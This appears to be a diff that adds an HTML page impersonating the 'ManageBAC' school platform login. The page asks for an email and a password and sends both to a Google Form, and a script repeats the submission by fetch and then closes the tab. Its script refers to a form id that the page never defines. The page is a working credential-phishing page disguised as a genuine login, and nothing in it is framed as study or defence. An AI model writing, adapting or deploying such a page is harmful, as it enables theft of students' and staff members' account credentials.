@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ManageBAC</title>
+</head>
+<body>
+    <h1>ManageBAC</h1>
+    <form action="https://docs.google.com/forms/d/e/1FAIpQLSeLUzCIfgjmIrQ5_WLAgCwliPWVqVraNd_mS3bSBL7XQs7KfQ/formResponse" method="POST">
+        <label for="email">Email:</label><br>
+        <input type="email" id="name" name="entry.1195553524" required><br><br>
+        <label for="password">Password:</label><br>
+        <input type="password" id="email" name="entry.117645491" required><br><br>
+        <button type="submit">Submit</button>
+      </form>
+
+    <script>
+        document.getElementById('googleForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const form = event.target;
+            const formData = new FormData(form);
+
+            // Submit the form data to Google Form's action URL
+            fetch("https://docs.google.com/forms/d/e/1FAIpQLSeLUzCIfgjmIrQ5_WLAgCwliPWVqVraNd_mS3bSBL7XQs7KfQ/formResponse", {
+                method: "POST",
+                body: formData,
+                mode: "no-cors" // Prevent CORS issues
+            }).then(() => {
+                // Close the current tab
+                window.close();
+            }).catch(error => {
+                console.error("Error submitting form:", error);
+                // Still close the tab even if there is an error
+                window.close();
+            });
+        });
+    </script>
+</body>
+</html>
